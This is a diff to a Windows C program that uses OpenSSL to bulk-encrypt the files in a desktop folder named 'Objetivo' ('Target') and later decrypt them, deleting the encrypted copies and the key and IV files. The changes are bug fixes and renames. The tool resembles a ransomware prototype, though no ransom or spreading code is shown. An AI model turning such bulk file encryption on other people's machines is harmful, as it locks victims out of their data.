@@ -73,7 +73,7 @@ void decryptFile(const char *inputFile, const char *outputFile, const unsigned c
         unsigned char buffer[1024];
         int bytesRead, decryptedLength;
 
-        while ((bytesRead = fread(buffer, 1, sizeof(buffer), input) > 0)) {
+        while ((bytesRead = fread(buffer, 1, sizeof(buffer), input)) > 0) {
             EVP_DecryptUpdate(ctx, buffer, &decryptedLength, buffer, bytesRead);
             fwrite(buffer, 1, decryptedLength, output);
         }
@@ -85,6 +85,8 @@ void decryptFile(const char *inputFile, const char *outputFile, const unsigned c
 
         fclose(input);
         fclose(output);
+
+        printf("Desencriptación exitosa. Se han desencriptado %d bytes.\n", bytesRead);
     } else {
         printf("Error: No se pudieron abrir los archivos de entrada o salida.\n");
     }
@@ -95,20 +97,20 @@ int main() {
     OpenSSL_add_all_algorithms();
 
     // Definir la ruta completa de la carpeta a encriptar
-    const char *LeerRegular = "C:\\Users\\usuario\\Desktop\\patata\\*.*"; // Ruta a la carpeta donde se leeran archivos a encritar
+    const char *LeerRegular = "C:\\Users\\Vatalefort\\Desktop\\Objetivo\\*.*"; // Ruta a la carpeta donde se leeran archivos a encritar
 
     // Definir la ruta completa de la carpeta de salida para archivos encriptados
-    const char *LeerEncriptaos = "C:\\Users\\usuario\\Desktop\\encriptao\\*.*"; // Ruta a la carpeta donde se leeran archivos encriptaos
+    const char *LeerEncriptados = "C:\\Users\\Vatalefort\\Desktop\\Encriptados\\*.*"; // Ruta a la carpeta donde se leeran archivos encriptaos
 
-    const char *CarpetaRegular = "C:\\Users\\usuario\\Desktop\\patata\\";
+    const char *CarpetaRegular = "C:\\Users\\Vatalefort\\Desktop\\Objetivo\\";
 
-    const char *CarpetaEncriptao = "C:\\Users\\usuario\\Desktop\\encriptao\\";
+    const char *CarpetaEncriptado = "C:\\Users\\Vatalefort\\Desktop\\Encriptados\\";
 
     // Definir la ruta completa al archivo de clave
-    const char *keyFileName = "C:\\Users\\usuario\\Desktop\\Clave.txt";
+    const char *keyFileName = "C:\\Users\\Vatalefort\\Desktop\\Clave.txt";
 
     // Definir la ruta completa al archivo del IV
-    const char *ivFileName = "C:\\Users\\usuario\\Desktop\\IV.txt";
+    const char *ivFileName = "C:\\Users\\Vatalefort\\Desktop\\IV.txt";
 
     // Definir la clave y el vector de inicialización (IV)
     unsigned char key[32];
@@ -130,9 +132,10 @@ int main() {
             return 1;
         }
 
-        // Realizar operaciones de descifrado sobre los archivos de la carpeta "encriptao"
+        // Realizar operaciones de descifrado sobre los archivos de la carpeta "encriptado"
         WIN32_FIND_DATA findFileData;
-        HANDLE hFind = FindFirstFile((LeerEncriptaos), &findFileData);
+     
+        HANDLE hFind = FindFirstFile((LeerEncriptados), &findFileData);
 
         if (hFind != INVALID_HANDLE_VALUE) {
             do {
@@ -140,7 +143,7 @@ int main() {
                     char inputFile[MAX_PATH];
                     char outputFile[MAX_PATH];
 
-                    _sntprintf(inputFile, MAX_PATH, _T("%s\\%s"), CarpetaEncriptao, findFileData.cFileName);
+                    _sntprintf(inputFile, MAX_PATH, _T("%s\\%s"), CarpetaEncriptado, findFileData.cFileName);
                     _sntprintf(outputFile, MAX_PATH, _T("%s\\%s"), CarpetaRegular, findFileData.cFileName);
 
                     if (_taccess(outputFile, 0) != 0) {
@@ -153,12 +156,12 @@ int main() {
                         fclose(newFile);
                     }
                     decryptFile(inputFile, outputFile, key, iv);
-                    remove(keyFileName);
-                    remove(ivFileName);
                     remove(inputFile);
                 }
             } while (FindNextFile(hFind, &findFileData) != 0);
 
+            remove(keyFileName);
+            remove(ivFileName);
             FindClose(hFind);
             printf("Archivos desencriptados con éxito.\n");
         } else {
@@ -184,7 +187,7 @@ int main() {
                     char outputFile[MAX_PATH];
 
                     _sntprintf(inputFile, MAX_PATH, _T("%s\\%s"), CarpetaRegular, findFileData.cFileName);
-                    _sntprintf(outputFile, MAX_PATH, _T("%s\\%s"), CarpetaEncriptao, findFileData.cFileName);
+                    _sntprintf(outputFile, MAX_PATH, _T("%s\\%s"), CarpetaEncriptado, findFileData.cFileName);
 
                     if (_taccess(outputFile, 0) != 0) {
                         // El archivo de salida no existe, así que lo creamos
